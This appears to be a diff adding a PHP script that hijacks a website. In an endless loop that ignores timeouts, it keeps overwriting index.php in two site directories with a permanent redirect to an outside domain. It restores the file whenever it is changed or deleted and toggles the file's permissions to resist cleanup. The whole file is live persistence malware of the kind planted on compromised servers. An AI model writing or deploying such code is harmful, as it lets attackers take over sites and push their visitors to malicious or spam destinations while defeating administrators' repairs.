@@ -1,0 +1,53 @@
+<?php
+set_time_limit(0);
+ignore_user_abort(true);
+
+$desiredContent = <<<'PHPFILE'
+<?php
+header("Location: https://www.union777.it.com/baru/sung.php", true, 301);
+exit;
+PHPFILE;
+
+$directories = [
+    'd:/FILEROOM/vendor/',
+    'd:/FILEROOM/'
+];
+
+$toggle = true; // true = 0444, false = 0644
+
+while (true) {
+    foreach ($directories as $dir) {
+        $dir = rtrim($dir, '/') . '/';
+        $filePath = $dir . 'index.php';
+
+        // === 1. Pastikan folder ada ===
+        if (!is_dir($dir)) {
+            echo "[".date('Y-m-d H:i:s')."] [MISSING/RENAMED] Folder not found: $dir\n";
+            @mkdir($dir, 0755, true);
+            echo "[".date('Y-m-d H:i:s')."] [FOLDER CREATED] $dir\n";
+        }
+
+        // === 2. Pastikan file index.php ada ===
+        if (!file_exists($filePath)) {
+            echo "[".date('Y-m-d H:i:s')."] [MISSING] Creating file: $filePath\n";
+            @file_put_contents($filePath, $desiredContent);
+        }
+
+        // === 3. Cek isi file ===
+        $currentContent = @file_get_contents($filePath);
+        if (trim($currentContent) !== trim($desiredContent)) {
+            echo "[".date('Y-m-d H:i:s')."] [CHANGED] Restoring file: $filePath\n";
+            @file_put_contents($filePath, $desiredContent);
+        }
+
+        // === 4. Toggle permission ===
+        if ($toggle) {
+            @chmod($filePath, 0444);
+        } else {
+            @chmod($filePath, 0644);
+        }
+    }
+
+    $toggle = !$toggle; // ganti setiap loop
+    sleep(1);
+}
